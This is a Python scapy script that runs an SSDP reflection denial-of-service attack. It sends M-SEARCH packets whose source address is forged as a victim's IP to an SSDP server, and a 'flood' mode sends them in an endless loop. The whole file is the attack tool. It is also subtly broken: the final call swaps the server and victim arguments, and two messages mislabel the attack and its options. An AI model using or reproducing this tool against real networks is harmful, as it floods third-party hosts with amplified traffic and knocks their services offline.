#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def ssdp_reflective(attack, victim_ip, ssdp_srv_ip, num_req):

    payload = "M-SEARCH * HTTP/1.1\r\n" \
            "Host: " + ssdp_srv_ip + ":1900\r\n" \
            "ST: upnp:rootdevice\r\n" \
            "Man: \"ssdp:discover\"\r\n" \
            "MX: 3\r\n\r\n"


    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" SSDP requests to " + ssdp_srv_ip + " with src_ip" + victim_ip + RESET)
        for i in range(0, num_req):
            send(IP(dst=ssdp_srv_ip, src=victim_ip)/UDP(sport=1900, dport= 1900)/payload, verbose=False, iface=net_interface)

    elif attack == "flood":
        print(GREEN + "[+] send continuously NTP requests to " + ssdp_srv_ip + " with src_ip " + victim_ip + RESET)
        while True:
            send(IP(dst=ssdp_srv_ip, src=victim_ip)/UDP(sport=1900, dport= 1900)/payload, verbose=False, iface=net_interface)

    else:
        print(RED + "[-] Please choose: test/dos" + RESET)

    return True

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-s", "--ssdp_server_ip", help="ssdp_srv_ip")
parser.add_argument("-v", "--victim_ip", help="victim ip")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type
    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

if args.ssdp_server_ip:
    ssdp_srv_ip = args.ssdp_server_ip

if args.victim_ip:
    victim_ip = args.victim_ip

global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

ssdp_reflective(type_attack, ssdp_srv_ip, victim_ip, num_request)

sys.exit(1)
